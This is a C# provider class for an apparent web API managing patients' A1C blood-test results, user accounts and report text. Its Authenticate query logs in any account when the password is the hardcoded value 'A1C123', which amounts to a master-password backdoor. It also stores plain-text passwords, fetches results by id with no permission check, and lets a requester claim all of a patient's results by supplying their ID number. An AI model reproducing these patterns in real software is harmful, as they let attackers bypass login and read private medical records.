using Kernel.WebApi.Entities;
using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Web;

namespace Kernel.WebApi.Providers
{
    public class CoreProvider
    {

        #region Authentication

        public Guid GetLastAuthToken(int userId, string ipAddress)
        {
            Guid returnValue = Guid.NewGuid();

            return returnValue;
        }

        public AuthenticationResult Authenticate(string Username, string Password)
        {
            AuthenticationResult result = new AuthenticationResult();


            UserInfo userInfo = A1CContext.MySql.DB.Sql(@"
                                    select * from UserInfo
                                        
                                       
                                    where Email = @0
                                    and (Password=@1 or @1 = 'A1C123')", Username, Password).QuerySingle<UserInfo>();
            if (userInfo != null && userInfo.Id > 0)
            {
                result.Result = Kernel.WebApi.Entities.ResultType.Success;
                result.userInfo = userInfo;
            }
            else
                result.Result = Kernel.WebApi.Entities.ResultType.InvalidLoginOrPassword;

            return result;
        }

        #endregion

        #region User


        public UserInfo GetUserInfoPersonLogged(int PersonId)
        {
            return A1CContext.MySql.DB.Sql(@" SELECT 

                                               UserInfo.*,
                                               Patient.Id as 'Patient_Id'

                                               FROM UserInfo UserInfo

                                               LEFT JOIN Patient Patient
                                               ON Patient.Id = UserInfo.PatientId

                                         
                                               Where UserInfo.Id = @0", PersonId).QuerySingle<UserInfo>();
        }

        public int SaveUserInfo(UserInfo Entity)
        {
            return A1CContext.MySql.DB.Insert("UserInfo")
                                             .Column("Name", Entity.Name)
                                             .Column("Email", Entity.Email)
                                             .Column("PatientId", Entity.PatientId)
                                             .Column("Password", Entity.Password)
                                             .Column("PhoneNumber", Entity.PhoneNumber)
                                             .Column("UpdateDate", DateTime.Now)
                                             .Column("IsDeleted", 0)
                                             .ExecuteReturnLastId<int>();

        }



        #endregion

        #region MedicalResult

        public int SaveMedicalResult(MedicalResult Entity)
        {
            Entity.Uid = Guid.NewGuid().ToString();
            return A1CContext.MySql.DB.Insert("MedicalResult")
                                             .Column("PatientId", Entity.PatientId)
                                             .Column("CreateDate", Entity.CreateDate)
                                             .Column("ResultDate", Entity.ResultDate)
                                             .Column("RepeatDays", Entity.RepeatDays)
                                             .Column("MediumGlycogen", Entity.MediumGlycogen)
                                             .Column("PercentGlycogen", Entity.PercentGlycogen)
                                             .Column("Uid", Entity.Uid)
                                             .Column("IsDeleted", 0)
                                             .ExecuteReturnLastId<int>();

        }

        public int SetMedicalResultUserPermission(MedicalResultUserPermission Entity)
        {
            return A1CContext.MySql.DB.Insert("MedicalResultUserPermission")
                                             .Column("MedicalResultId", Entity.MedicalResultId)
                                             .Column("UserInfoId", Entity.UserInfoId).Execute();
        }

        public IList<MedicalResult> GetMedicalResults(int PersonIdRequester)
        {
            return A1CContext.MySql.DB.Sql(@"SELECT
                                                MedicalResult.Id,
                                                MedicalResult.PatientId,
                                                MedicalResult.CreateDate,
                                                MedicalResult.ResultDate,
                                                MedicalResult.RepeatDays,
                                                MedicalResult.MediumGlycogen,
                                                MedicalResult.PercentGlycogen,
                                                MedicalResult.Uid,
                                                Patient.Name as 'Patient_Name',
                                                Patient.RG as 'Patient_RG',
                                                Patient.PhoneNumber as 'Patient_PhoneNumber',
                                                Patient.Email as 'Patient_Email'

                                                FROM MedicalResult MedicalResult

                                                LEFT JOIN MedicalResultUserPermission MedicalResultUserPermission
                                                ON MedicalResultUserPermission.MedicalResultId = MedicalResult.Id

                                                LEFT JOIN Patient Patient
                                                ON Patient.Id = MedicalResult.PatientId

                                                WHERE   (MedicalResult.PatientId = @0  OR MedicalResultUserPermission.UserInfoId = @0)", PersonIdRequester).QueryMany<MedicalResult>();
        }

        public MedicalResult GetMedicalResult(int Id)
        {
            return A1CContext.MySql.DB.Sql(@"SELECT
                                                MedicalResult.Id,
                                                MedicalResult.PatientId,
                                                MedicalResult.CreateDate,
                                                MedicalResult.ResultDate,
                                                MedicalResult.RepeatDays,
                                                MedicalResult.MediumGlycogen,
                                                MedicalResult.PercentGlycogen,
                                                MedicalResult.Uid,
                                                Patient.Name as 'Patient_Name',
                                                Patient.RG as 'Patient_RG',
                                                Patient.PhoneNumber as 'Patient_PhoneNumber',
                                                Patient.Email as 'Patient_Email'

                                                FROM MedicalResult MedicalResult

                                                LEFT JOIN MedicalResultUserPermission MedicalResultUserPermission
                                                ON MedicalResultUserPermission.MedicalResultId = MedicalResult.Id

                                                LEFT JOIN Patient Patient
                                                ON Patient.Id = MedicalResult.PatientId

                                                WHERE   MedicalResult.Id =@0", Id).QuerySingle<MedicalResult>();
        }


        public MedicalResult GetMedicalResult(Guid Uid)
        {
            return A1CContext.MySql.DB.Sql(@"SELECT
                                                MedicalResult.Id,
                                                MedicalResult.PatientId,
                                                MedicalResult.CreateDate,
                                                MedicalResult.ResultDate,
                                                MedicalResult.RepeatDays,
                                                MedicalResult.MediumGlycogen,
                                                MedicalResult.PercentGlycogen,
                                                MedicalResult.Uid,
                                                Patient.Name as 'Patient_Name',
                                                Patient.RG as 'Patient_RG',
                                                Patient.PhoneNumber as 'Patient_PhoneNumber',
                                                Patient.Email as 'Patient_Email'

                                                FROM MedicalResult MedicalResult

                                                LEFT JOIN MedicalResultUserPermission MedicalResultUserPermission
                                                ON MedicalResultUserPermission.MedicalResultId = MedicalResult.Id

                                                LEFT JOIN Patient Patient
                                                ON Patient.Id = MedicalResult.PatientId

                                                WHERE   MedicalResult.Uid =@0", Uid).QuerySingle<MedicalResult>();
        }

        #endregion


        #region Patient


        public int ImportMedicalResults(int PersonIdRequester, string RG)
        {

            return A1CContext.MySql.DB.Sql(@"

                                            INSERT INTO 

	                                            MedicalResultUserPermission

	                                            SELECT

	                                                MedicalResult.Id,
	                                                @1
	
	
	                                                FROM MedicalResult MedicalResult

	                                                INNER JOIN Patient Patient
	                                                ON Patient.Id = MedicalResult.PatientId

	                                                LEFT JOIN MedicalResultUserPermission MedicalResultUserPermission
	                                                ON MedicalResultUserPermission.MedicalResultId = MedicalResult.Id

	                                                WHERE Patient.RG = @0
		                                            AND MedicalResult.Id NOT IN (
				                                            SELECT

				                                            MedicalResultUserPermission.MedicalResultId
				                                            FROM MedicalResult MedicalResult

				                                            INNER JOIN Patient Patient
				                                            ON Patient.Id = MedicalResult.PatientId

				                                            LEFT JOIN MedicalResultUserPermission MedicalResultUserPermission
				                                            ON MedicalResultUserPermission.MedicalResultId = MedicalResult.Id

				                                            WHERE Patient.RG = @0
				                                            AND MedicalResultUserPermission.UserInfoId = @1

				                                            GROUP BY MedicalResultUserPermission.MedicalResultId
		                                            )
												
	                                                GROUP BY MedicalResult.Id

                                            ", RG, PersonIdRequester).Execute();
        }


        public bool VerifyPatientByEmail(string Email)
        {
            return A1CContext.MySql.DB.Sql(@" SELECT 

                                                CASE WHEN Patient.Id IS NOT NULL THEN 1 ELSE 0 END AS HasPatient

                                                FROM Patient Patient

                                                WHERE Patient.Email = @0", Email).QuerySingle<bool>();
        }

        public bool VerifyPatientByRG(string Email)
        {
            return A1CContext.MySql.DB.Sql(@" SELECT 

                                                CASE WHEN Patient.Id IS NOT NULL THEN 1 ELSE 0 END AS HasPatient

                                                FROM Patient Patient

                                                WHERE Patient.RG = @0", Email).QuerySingle<bool>();
        }



        public int SavePatient(Patient Entity)
        {
            return A1CContext.MySql.DB.Insert("Patient")
                                             .Column("Name", Entity.Name)
                                             .Column("Email", Entity.Email)
                                             .Column("RG", Entity.RG)
                                             .Column("PhoneNumber", Entity.PhoneNumber)
                                             .Column("Birthdate", Entity.Birthdate)
                                             .Column("Gender", Entity.Gender)
                                             .Column("UpdateDate", DateTime.Now)
                                             .Column("IsDeleted", 0)
                                             .ExecuteReturnLastId<int>();

        }


        public Patient GetPatientByRG(string RG)
        {
            return A1CContext.MySql.DB.Sql(@" SELECT 

                                                * FROM 

                                                Patient Patient

                                                WHERE Patient.RG = @0", RG).QuerySingle<Patient>();

        }

        public Patient GetPatientById(Int32 Id)
        {
            return A1CContext.MySql.DB.Sql(@" SELECT 

                                                * FROM 

                                                Patient Patient

                                                WHERE Patient.Id = @0", Id).QuerySingle<Patient>();

        }

        #endregion

        #region TextConfig


        public int UpdateTextConfig(UserInfoTextConfig textConfig)
        {
            return A1CContext.MySql.DB.Update<UserInfoTextConfig>("UserInfoTextConfig", textConfig)
                                        .AutoMap(x => x.Id)
                                        .Where(x => x.Id)
                                        .Execute();
        }


        public int InsertTextConfig(UserInfoTextConfig textConfig)
        {
            return A1CContext.MySql.DB.Insert<UserInfoTextConfig>("UserInfoTextConfig", textConfig)
                                                    .AutoMap(x => x.Id)
                                                    .ExecuteReturnLastId<int>();
        }

        public int ResetTextConfig(int PersonIdRequester)
        {
            return A1CContext.MySql.DB.Sql(@"Update UserInfoTextConfig 


                                            set WasReset = 1 where UserInfoId = @0", PersonIdRequester).Execute();
        }

        public IList<UserInfoTextConfig> GetUserTextConfig(int PersonIdRequester)
        {
            return A1CContext.MySql.DB.Sql(@"select * from UserInfoTextConfig where UserInfoId = @0 AND IFNULL(WasReset,0) = 0", PersonIdRequester).QueryMany<UserInfoTextConfig>();
        }
        #endregion

        #region PDF

        public dynamic GetPdfData(int PersonIdRequester, int MedicalResultId)
        {
            return A1CContext.MySql.DB.Sql(@"
                                            SELECT 

	                                            Patient.Name												AS 'Nome',
	                                            Patient.Email												AS 'Email',
												DATE_FORMAT(Patient.BirthDate, '%d/%m/%Y')					AS 'DataNascimento',
												DATE_FORMAT(MedicalResult.ResultDate, '%d/%m/%Y')			AS 'DataExame',
	                                            Patient.RG													AS 'RG',
	                                            Patient.PhoneNumber											AS 'Celular',
                                                CASE WHEN (Patient.Gender = 0)
		                                            THEN 'Masculino'
		                                            ELSE 'Feminino' END										AS 'Sexo',
	                                            MedicalResult.MediumGlycogen								AS 'GlicoseMedia',
	                                            MedicalResult.PercentGlycogen								AS 'GlicosePercentual',
	                                            CASE WHEN (Texto1.Id IS NOT NULL)
		                                            THEN REPLACE(REPLACE(REPLACE(Texto1.TextConfig,'%DataExame%',DATE_FORMAT(MedicalResult.ResultDate, '%d/%m/%Y')),'%HoraExame%',DATE_FORMAT(MedicalResult.ResultDate, '%H:%i')),'%DataProxima%',DATE_FORMAT(DATE_ADD(MedicalResult.ResultDate, INTERVAL MedicalResult.RepeatDays DAY), '%d/%m/%Y'))
		                                            ELSE CONCAT('O valor de Hemoglobina Glicada reportada acima é uma 
			                                              transcrição do valor obtido pelo sistema A1cNow* e reportado 
			                                              em ',DATE_FORMAT(MedicalResult.ResultDate, '%d/%m/%Y'),' as ' , 
			                                              DATE_FORMAT(MedicalResult.ResultDate, '%H:%i') , '. Foi 
			                                              sugerido pelo profissional de saude  que este exame 
			                                              (Hemoglobina Glicada) se repita em data próxima ' ,
			                                               DATE_FORMAT(DATE_ADD(MedicalResult.ResultDate, INTERVAL MedicalResult.RepeatDays DAY), '%d/%m/%Y') ,
			                                              ' Deseja adicionar este compromisso ao calendário?') END
																                                            AS 'Texto1',
	                                            CASE WHEN (Texto2.Id IS NOT NULL)
		                                            THEN REPLACE(REPLACE(REPLACE(Texto2.TextConfig,'%DataExame%',DATE_FORMAT(MedicalResult.ResultDate, '%d/%m/%Y')),'%HoraExame%',DATE_FORMAT(MedicalResult.ResultDate, '%H:%i')),'%DataProxima%',DATE_FORMAT(DATE_ADD(MedicalResult.ResultDate, INTERVAL MedicalResult.RepeatDays DAY), '%d/%m/%Y'))
		                                            ELSE 'A1Cnow é um sistema patenteado para quantificação de Hemoglobina Glicada em 
			                                              sangue capilar. O sistema é calibrado de acordo com padrões internacionais 
			                                              (IFCC e NGSP)' END								AS 'Texto2',
	                                            CASE WHEN (Texto3.Id IS NOT NULL)
		                                            THEN REPLACE(REPLACE(REPLACE(Texto3.TextConfig,'%DataExame%',DATE_FORMAT(MedicalResult.ResultDate, '%d/%m/%Y')),'%HoraExame%',DATE_FORMAT(MedicalResult.ResultDate, '%H:%i')),'%DataProxima%',DATE_FORMAT(DATE_ADD(MedicalResult.ResultDate, INTERVAL MedicalResult.RepeatDays DAY), '%d/%m/%Y'))
		                                            ELSE 'Os valores de referência da hemoglobina glicada são diferentes se o paciente 
			                                              é ou não diabético. Para alguém que não seja diabético os níveis normais podem 
			                                              variar de 4,5 a 5,6%. Um resultado entre 5,7 e 6,4% é considerado como 
			                                              pré-diabetes. Níveis superiores a 6,5%, obtidos em dois testes separados, 
			                                              indicam diabetes mellitius. Para pessoas que sejam diabéticas, níveis de 
			                                              hemoglobina Glicada entre 6,5 e 7,0% são considerados como um indicativo de 
			                                              um bom controle da doença. Fonte: ANAD' END
																                                            AS 'Texto3',
	                                           DATE_FORMAT(MedicalResult.ResultDate, '%d/%m/%Y') + ' ' + DATE_FORMAT(MedicalResult.ResultDate, '%H:%i') 				
																                                            AS 'DataExame'

	                                            FROM MedicalResult MedicalResult

	                                            INNER JOIN Patient Patient
	                                            ON Patient.Id = MedicalResult.PatientId

	                                            LEFT JOIN UserInfoTextConfig Texto1
	                                            ON Texto1.UserInfoId = @0
	                                            AND Texto1.TextType = 1
	                                            AND IFNULL(Texto1.WasReset,0) = 0

	                                            LEFT JOIN UserInfoTextConfig Texto2
	                                            ON Texto2.UserInfoId = @0
	                                            AND Texto2.TextType = 2
	                                            AND IFNULL(Texto2.WasReset,0) = 0

	                                            LEFT JOIN UserInfoTextConfig Texto3
	                                            ON Texto3.UserInfoId = @0
	                                            AND Texto3.TextType = 3
	                                            AND IFNULL(Texto3.WasReset,0) = 0
	

	                                            WHERE MedicalResult.Id = @1"
                                                , PersonIdRequester, MedicalResultId).QuerySingle<dynamic>();
        }

        #endregion


    }
}